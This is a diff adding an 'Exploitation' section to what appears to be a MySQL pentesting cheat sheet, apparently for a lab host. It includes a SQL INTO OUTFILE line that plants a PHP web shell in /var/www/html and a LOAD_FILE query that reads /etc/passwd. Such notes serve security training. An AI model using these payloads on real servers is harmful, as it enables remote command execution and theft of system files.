@@ -25,13 +25,38 @@
         <div class="notion-body">
 
             <h2>Usage</h2>
-            <h3> Connect to DB </h3>
+            <h3>Connect to DB</h3>
             <ul>
                 <p> You must have impacket suit installed (/examples directory)</p>
                 <pre><code class="language-bash">mysql -u root -h 10.129.14.132 -p</code></pre>
                 <p>In case you see an error like <b>"ERROR 2026 (HY000): TLS/SSL error: self-signed certificate in certificate chain"</b> just use <b>--skip-ssl</b></p>
             </ul>
 
+            <h2>Exploitation</h2>
+            <ul>
+                <h3>Command execution</h3>
+                <ul>
+                    <p>We can achieve command execution if we write to a location in the file system that can execute our commands</p>
+                    <p>These operations are permitted only to users who have the FILE privilege. secure_file_priv may be set as follows:
+                    <ul>
+                        <li>If empty, the variable has no effect, which is not a secure setting.</li>
+                        <li>If set to the name of a directory, the server limits import and export operations to work only with files in that directory. The directory must exist; the server does not create it.</li>
+                        <li>If set to NULL, the server disables import and export operations.</p></li>
+                    </ul>
+                    <p>Use the following command to check how the variable is set</p>
+                    <pre><code class="language-sql">show variables like "secure_file_priv";</code></pre>
+                    <p>In case it's empty or it is located only in a specific folder we can try to perform</p>
+                    <pre><code class="language-sql">SELECT "&lt;?php echo shell_exec($_GET['c']);?&gt;" INTO OUTFILE '/var/www/html/webshell.php';</code></pre>
+                    
+
+                </ul>
+                <h3>File read</h3>
+                <p>In case you have the READ permissions you are able to read system files by doing</p>
+                <pre><code class="language-sql">select LOAD_FILE("/etc/passwd");</code></pre>
+            </ul>
+            
+
+                
            
         </div>
     </div>
